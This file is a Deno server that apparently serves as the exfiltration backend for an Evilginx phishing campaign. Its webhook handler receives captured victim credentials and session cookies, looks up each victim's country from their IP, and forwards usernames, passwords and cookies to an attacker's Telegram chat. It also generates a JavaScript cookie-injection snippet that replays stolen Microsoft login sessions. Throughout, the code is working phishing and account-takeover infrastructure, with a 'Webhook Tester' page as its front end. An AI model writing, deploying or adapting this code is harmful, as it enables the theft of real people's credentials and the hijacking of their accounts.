Deno.serve(async (request: Request) => {
  const url = new URL(request.url);

  // Serve the frontend UI
  if (request.method === 'GET' && url.pathname === '/') {
    return new Response(getHTML(), {
      headers: { 'Content-Type': 'text/html' }
    });
  }

  // Handle manual test from frontend
  if (request.method === 'POST' && url.pathname === '/test') {
    return handleManualTest(request);
  }

  // Handle webhook from Evilginx
  if (request.method === 'POST' && url.pathname === '/webhook') {
    return handleWebhook(request);
  }

  return new Response('Not found', { status: 404 });
});

async function handleManualTest(request: Request) {
  console.log('Manual test endpoint called');
  
  try {
    const formData = await request.json();
    console.log('Received form data:', JSON.stringify(formData, null, 2));
    
    const { botToken, chatId, message } = formData;

    if (!botToken || !chatId || !message) {
      console.error('Missing required fields');
      return new Response(JSON.stringify({
        success: false,
        error: 'Missing required fields'
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    console.log('Attempting to send to Telegram...');

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const telegramPayload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    };
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(telegramPayload)
    });

    const result = await response.json();

    if (!result.ok) {
      console.error('Telegram API returned error:', result);
      return new Response(JSON.stringify({
        success: false,
        error: result.description || 'Telegram API error',
        errorCode: result.error_code,
        details: result
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    console.log('Message sent successfully!');
    return new Response(JSON.stringify({
      success: true,
      message: 'Message sent successfully!',
      telegramResponse: result
    }), {
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (error) {
    console.error('Exception in handleManualTest:', error);
    
    return new Response(JSON.stringify({
      success: false,
      error: error.message
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function handleWebhook(request: Request) {
  console.log('Webhook endpoint called');
  
  try {
    const payload = await request.json();
    
    // Get environment variables
    const API_TOKEN = Deno.env.get('API_TOKEN');
    const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
    
    // Verify API token if set
    const authHeader = request.headers.get('Authorization');
    if (API_TOKEN && authHeader !== `Bearer ${API_TOKEN}`) {
      console.error('Unauthorized webhook attempt');
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    console.log('Received event:', payload.event);

    // Get IP geolocation
    const ip = payload.origin;
    const countryData = await getIPGeolocation(ip);
    
    // Handle different event types
    if (payload.event === 'session_captured') {
      if (payload.session?.cookies?.length > 0) {
        await sendSessionCapturedWithFile(payload, TELEGRAM_BOT_TOKEN!, TELEGRAM_CHAT_ID!, countryData);
      } else {
        await sendInvalidCredentialMessage(payload, TELEGRAM_BOT_TOKEN!, TELEGRAM_CHAT_ID!, countryData);
      }
    } else if (payload.event === 'credential_captured') {
      await sendInvalidCredentialMessage(payload, TELEGRAM_BOT_TOKEN!, TELEGRAM_CHAT_ID!, countryData);
    } else {
      await sendRegularMessage(payload, TELEGRAM_BOT_TOKEN!, TELEGRAM_CHAT_ID!, countryData);
    }
    
    return new Response(JSON.stringify({ 
      message: 'Webhook received successfully',
      event: payload.event
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
    
  } catch (error) {
    console.error('Error in webhook handler:', error);
    return new Response(JSON.stringify({ error: 'Error processing webhook' }), {
      status: 400,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function getIPGeolocation(ip: string) {
  try {
    if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || 
        ip.startsWith('10.') || ip.startsWith('172.')) {
      return { country: 'Local', flag: '🏠' };
    }
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      const data = await response.json();
      const country = data.country_name || 'Unknown';
      const countryCode = data.country_code || '';
      const flag = countryCode ? getFlagEmoji(countryCode) : '🏳️';
      
      return { country, flag, countryCode };
    }
    
    const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}`);
    if (fallbackResponse.ok) {
      const data = await fallbackResponse.json();
      if (data.status === 'success') {
        const country = data.country || 'Unknown';
        const countryCode = data.countryCode || '';
        const flag = countryCode ? getFlagEmoji(countryCode) : '🏳️';
        
        return { country, flag, countryCode };
      }
    }
  } catch (error) {
    console.error('Geolocation error:', error);
  }
  
  return { country: 'Unknown', flag: '🏳️', countryCode: '' };
}

function getFlagEmoji(countryCode: string) {
  if (!countryCode || countryCode.length !== 2) return '🏳️';
  
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  
  return String.fromCodePoint(...codePoints);
}

async function sendSessionCapturedWithFile(
  payload: any, 
  botToken: string, 
  chatId: string, 
  countryData: any
) {
  const { server_name, origin, phishlet, session } = payload;
  const cookies = session.cookies;
  
  const caption = formatSessionCapturedCaption(payload, countryData);
  
  const username = session.credentials?.username || 'unknown';
  const password = session.credentials?.password || '';
  
  let redirectUrl = 'https://login.microsoftonline.com';
  if (phishlet && phishlet.toLowerCase().includes('microsoft')) {
    redirectUrl = 'https://login.microsoftonline.com';
  }
  
  const redirectBase64 = btoa(redirectUrl);
  
  const jsCode = `let ipaddress = \`${origin}\`;
let email = \`${username}\`;
let password = \`${password}\`;
!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);
for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;
window.location.href=atob('${redirectBase64}')}();`;
  
  const formData = new FormData();
  const blob = new Blob([jsCode], { type: 'text/plain' });
  formData.append('document', blob, `${session.credentials?.username || 'session'}.txt`);
  formData.append('chat_id', chatId);
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');
  
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
  await fetch(telegramUrl, {
    method: 'POST',
    body: formData
  });
}

async function sendInvalidCredentialMessage(
  payload: any,
  botToken: string,
  chatId: string,
  countryData: any
) {
  const { server_name, origin, session } = payload;
  const { country, flag } = countryData;
  
  let message = `<b>🚫 INVALID CREDENTIAL CAPTURED</b>\n\n`;
  message += `<b>🌐 Server:</b> ${server_name}\n`;
  message += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  message += `<b>🗾 Country:</b> ${country} ${flag}\n`;
  
  let credentials: any = {};
  
  if (session?.credentials) {
    credentials = session.credentials;
  } else if (payload.credentials) {
    credentials = payload.credentials;
  }
  
  if (credentials.username) {
    message += `<b>👤 username:</b> <code>${credentials.username}</code>\n`;
  }
  if (credentials.password) {
    message += `<b>🔑 password:</b> <code>${credentials.password}</code>\n`;
  }
  
  for (const [key, value] of Object.entries(credentials)) {
    if (key !== 'username' && key !== 'password' && value) {
      message += `<b>${key}:</b> <code>${value}</code>\n`;
    }
  }
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
}

async function sendRegularMessage(
  payload: any,
  botToken: string,
  chatId: string,
  countryData: any
) {
  const message = formatRegularMessage(payload, countryData);
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
}

function formatSessionCapturedCaption(payload: any, countryData: any) {
  const { server_name, origin, session } = payload;
  const { country, flag } = countryData;
  
  let caption = `<b>🍪 COOKIES CAPTURED</b>\n\n`;
  caption += `<b>🌐 Server:</b> ${server_name}\n`;
  caption += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  caption += `<b>🗾 Country:</b> ${country} ${flag}\n`;
  
  if (session?.credentials) {
    if (session.credentials.username) {
      caption += `<b>👤 username:</b> <code>${session.credentials.username}</code>\n`;
    }
    if (session.credentials.password) {
      caption += `<b>🔑 password:</b> <code>${session.credentials.password}</code>\n`;
    }
    
    for (const [key, value] of Object.entries(session.credentials)) {
      if (key !== 'username' && key !== 'password') {
        caption += `<b>${key}:</b> <code>${value}</code>\n`;
      }
    }
  }
  
  if (session?.cookies?.length > 0) {
    caption += `\n✅ Love is Evol. Dey with me!.`;
  }
  
  return caption;
}

function formatRegularMessage(payload: any, countryData: any) {
  const { server_name, event, origin } = payload;
  const { country, flag } = countryData;

  const eventEmojis: Record<string, string> = {
    lure_clicked: '🪝',
    lure_landed: '🎣'
  };

  const eventLabels: Record<string, string> = {
    lure_landed: 'LINK LANDED'
  };

  const emoji = eventEmojis[event] || '🔔';
  const eventName = eventLabels[event] ?? event.replace(/_/g, ' ').toUpperCase();

  let message = `<b>${emoji} ${eventName}</b>\n\n`;
  message += `<b>🌐 Server:</b> ${server_name}\n`;
  message += `<b>📍 IP:</b> <code>${origin}</code>\n`;
  message += `<b>🗾 Country:</b> ${country} ${flag}\n`;

  return message;
}

function getHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Webhook Tester</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: white;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      max-width: 600px;
      width: 100%;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 10px;
      color: #2d3748;
      text-align: center;
    }

    .subtitle {
      text-align: center;
      color: #718096;
      margin-bottom: 30px;
      font-size: 14px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #4a5568;
      font-weight: 600;
      font-size: 14px;
    }

    input, textarea {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.3s;
      font-family: inherit;
    }

    input:focus, textarea:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }

    textarea {
      resize: vertical;
      min-height: 100px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
    }

    button:active {
      transform: translateY(0);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .result {
      margin-top: 20px;
      padding: 16px;
      border-radius: 8px;
      font-size: 14px;
      display: none;
      white-space: pre-wrap;
      word-break: break-word;
    }

    .result.success {
      background: #c6f6d5;
      border: 2px solid #48bb78;
      color: #22543d;
      display: block;
    }

    .result.error {
      background: #fed7d7;
      border: 2px solid #fc8181;
      color: #742a2a;
      display: block;
    }

    .hint {
      font-size: 12px;
      color: #a0aec0;
      margin-top: 4px;
    }

    .webhook-info {
      background: #f7fafc;
      border: 2px solid #e2e8f0;
      border-radius: 8px;
      padding: 16px;
      margin-bottom: 30px;
    }

    .webhook-info h3 {
      font-size: 14px;
      color: #4a5568;
      margin-bottom: 8px;
    }

    .webhook-info code {
      background: #edf2f7;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 13px;
      color: #2d3748;
      word-break: break-all;
    }

    .loading {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📱 Telegram Webhook Tester</h1>
    <p class="subtitle">Test your Telegram bot integration</p>

    <div class="webhook-info">
      <h3>Webhook Endpoint:</h3>
      <code id="webhookUrl"></code>
    </div>

    <form id="testForm">
      <div class="form-group">
        <label for="botToken">Bot Token</label>
        <input 
          type="text" 
          id="botToken" 
          placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
          required
        >
        <div class="hint">Get from @BotFather in Telegram</div>
      </div>

      <div class="form-group">
        <label for="chatId">Chat ID</label>
        <input 
          type="text" 
          id="chatId" 
          placeholder="123456789"
          required
        >
        <div class="hint">Your user ID or group chat ID (use @userinfobot)</div>
      </div>

      <div class="form-group">
        <label for="message">Test Message</label>
        <textarea 
          id="message" 
          required
        >🧪 Test Message

This is a test from your Evilginx webhook!

If you see this, your bot is working correctly. ✅</textarea>
      </div>

      <button type="submit" id="submitBtn">
        <span id="btnText">Send Test Message</span>
      </button>
    </form>

    <div id="result" class="result"></div>
  </div>

  <script>
    document.getElementById('webhookUrl').textContent = 
      window.location.origin + '/webhook';

    document.getElementById('testForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const submitBtn = document.getElementById('submitBtn');
      const btnText = document.getElementById('btnText');
      const result = document.getElementById('result');
      
      submitBtn.disabled = true;
      btnText.innerHTML = 'Sending... <span class="loading"></span>';
      result.style.display = 'none';
      
      try {
        const payload = {
          botToken: document.getElementById('botToken').value.trim(),
          chatId: document.getElementById('chatId').value.trim(),
          message: document.getElementById('message').value
        };
        
        const response = await fetch('/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        
        if (data.success) {
          result.className = 'result success';
          result.textContent = '✅ ' + data.message;
        } else {
          result.className = 'result error';
          let errorMsg = '❌ Error: ' + data.error;
          if (data.errorCode) {
            errorMsg += '\\n\\nError Code: ' + data.errorCode;
          }
          if (data.details) {
            errorMsg += '\\n\\nDetails: ' + JSON.stringify(data.details, null, 2);
          }
          result.textContent = errorMsg;
        }
      } catch (error) {
        result.className = 'result error';
        result.textContent = '❌ Request failed: ' + error.message;
      } finally {
        submitBtn.disabled = false;
        btnText.textContent = 'Send Test Message';
      }
    });
  </script>
</body>
</html>`;
}
